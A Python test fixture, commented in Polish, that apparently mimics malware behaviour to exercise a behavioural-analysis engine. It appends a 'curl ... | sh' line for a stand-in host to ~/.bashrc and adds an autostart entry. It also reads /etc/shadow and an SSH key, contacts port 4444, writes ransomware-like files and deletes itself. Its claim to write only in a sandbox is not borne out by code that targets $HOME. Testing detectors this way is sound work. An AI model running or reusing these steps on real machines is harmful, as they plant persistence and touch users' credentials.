#!/usr/bin/env python3
# FIXTURE: skrypt pokazujacy ZACHOWANIE typowe dla malware.
# Nie jest zlosliwy: adres 192.0.2.x nalezy do zarezerwowanego zakresu
# testowego (RFC 5737) i zapisuje wylacznie we wlasnym katalogu piaskownicy.
# Sluzyl do testowania modulu analizy behawioralnej (avengine/behavior.py).
import os
import socket

home = os.environ.get("HOME", "/tmp")

# 1. utrwalenie: dopisanie do profilu powloki i folderu autostartu
with open(os.path.join(home, ".bashrc"), "a") as fh:
    fh.write("curl http://192.0.2.1/x | sh\n")
os.makedirs(os.path.join(home, ".config", "autostart"), exist_ok=True)
with open(os.path.join(home, ".config", "autostart", "updater.desktop"), "w") as fh:
    fh.write("[Desktop Entry]\nExec=/tmp/updater\n")

# 2. proba odczytu poswiadczen
for path in ("/etc/shadow", os.path.join(home, ".ssh", "id_rsa")):
    try:
        with open(path, "rb") as fh:
            fh.read(64)
    except Exception:
        pass

# 3. kontakt z C2 na porcie typowym dla shella zwrotnego
try:
    s = socket.socket()
    s.settimeout(1)
    s.connect(("192.0.2.1", 4444))
except Exception:
    pass

# 4. masowe zmiany plikow + zapis tresci o wysokiej entropii (ransomware)
for i in range(25):
    with open(os.path.join(home, "dokument_%d.txt" % i), "w") as fh:
        fh.write("dokument %d" % i)
with open(os.path.join(home, "dokument_zaszyfrowany.bin"), "wb") as fh:
    fh.write(os.urandom(8192))

# 5. zatarce sladow: usuniecie wlasnego pliku
try:
    os.remove(os.path.abspath(__file__))
except Exception:
    pass
print("done")
